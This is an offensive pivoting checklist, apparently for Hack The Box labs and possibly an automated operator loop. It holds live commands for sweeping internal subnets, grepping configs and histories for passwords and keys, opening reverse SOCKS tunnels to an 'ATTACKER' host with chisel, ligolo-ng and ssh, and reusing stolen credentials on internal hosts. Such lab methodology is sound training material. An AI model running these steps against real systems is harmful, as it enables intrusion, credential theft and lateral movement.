# Pivoting Checklist — Operator Loop

> Terse. Run this on **every** foothold. Full procedure:
> `playbooks/pivoting-and-tunneling.md`. Triage: `playbooks/archetypes/multi-host-pivot.md`.

## Detect (do FIRST, before privesc)

- [ ] `ip -brief a; ip route` — second NIC / private route Kali can't reach?
- [ ] `cat /etc/hosts /etc/resolv.conf` — named internal hosts / internal DNS?
- [ ] `ss -tlnp || netstat -tlnp` — services bound to 127.0.0.1 only?
- [ ] `cat ~/.ssh/known_hosts /home/*/.ssh/known_hosts` — hosts it SSHes to?
- [ ] `arp -a; ip neigh` — neighbours it has talked to?
- [ ] Windows: `ipconfig /all & route print & arp -a & netstat -ano`
- [ ] **Multi-host? → keep going. Not? → proceed with normal privesc.**

## Map the internal segment (from the foothold, no nmap)

- [ ] Subnet from 2nd NIC (e.g. `172.16.5.15/24` → `172.16.5.0/24`).
- [ ] Ping sweep: `for i in $(seq 1 254); do (ping -c1 -W1 172.16.5.$i>/dev/null 2>&1 && echo $i UP)& done; wait`
- [ ] Port check per live host via `/dev/tcp` (22 80 135 139 443 445 1433 3306 3389 5985 8080).

## Loot for next-host creds

- [ ] `~/.ssh/` keys + config; app configs (`.env`, `wp-config.php`, `appsettings.json`, `docker-compose.yml`).
- [ ] `grep -rIniE 'password|secret|host=|connectionstring' /var/www /opt /home /etc`
- [ ] `~/.bash_history`, `.mysql_history`, `.psql_history`; Windows `cmdkey /list`, `.rdp`, GPP.

## Establish tunnel (pick one)

- [ ] **ligolo-ng** (preferred): proxy on Kali → agent on foothold → `start` → `sudo ip route add <subnet> dev ligolo`. Native tools work.
- [ ] **chisel** fallback: `chisel server -p 8080 --reverse` (Kali) + `chisel client ATTACKER:8080 R:socks` (foothold) → proxychains socks5 127.0.0.1 1080.
- [ ] **SSH creds?** `ssh -D 1080` (SOCKS) / `ssh -L` (one service) / `sshuttle -r user@pivot <subnet>` (whole subnet, no proxychains).
- [ ] Reverse shell from internal host → point at **pivot internal IP** + ligolo `listener_add` / `ssh -R`.

## Reach & attack internal host

- [ ] Verify: `proxychains4 -q nmap -sT -Pn -n -p <ports> <ip>` (or native nmap if ligolo/sshuttle).
- [ ] **Reuse foothold creds first**: `nxc smb` / `evil-winrm` / `ssh` / `mssqlclient` through tunnel.
- [ ] Match internal host to its own archetype; enumerate through the tunnel.
- [ ] Second host dual-homed too? → **double pivot** (agent → pivot1 internal IP).

## Feed the hypothesis bank

- [ ] `orchestrator.sh report "dual-homed; internal hosts X,Y; pivoting required"`.
- [ ] `target-model.md`: add internal segment + hosts + bold **PIVOTING REQUIRED**.
- [ ] Add one hypothesis (H1/H2/H3 style) per internal host.
- [ ] Save tunnel binaries under `reports/<target>/tunnels/`; write exact rebuild lines in `notes.md`.

## Gotchas

- [ ] proxychains nmap = `-sT -Pn -n` only (no SYN/UDP/ping/raw sockets).
- [ ] chisel/ligolo client+server must be the **same version**.
- [ ] `ip route add` the **internal** subnet, not the foothold's HTB IP.
- [ ] Tunnels die with the shell — documented rebuild = seconds.
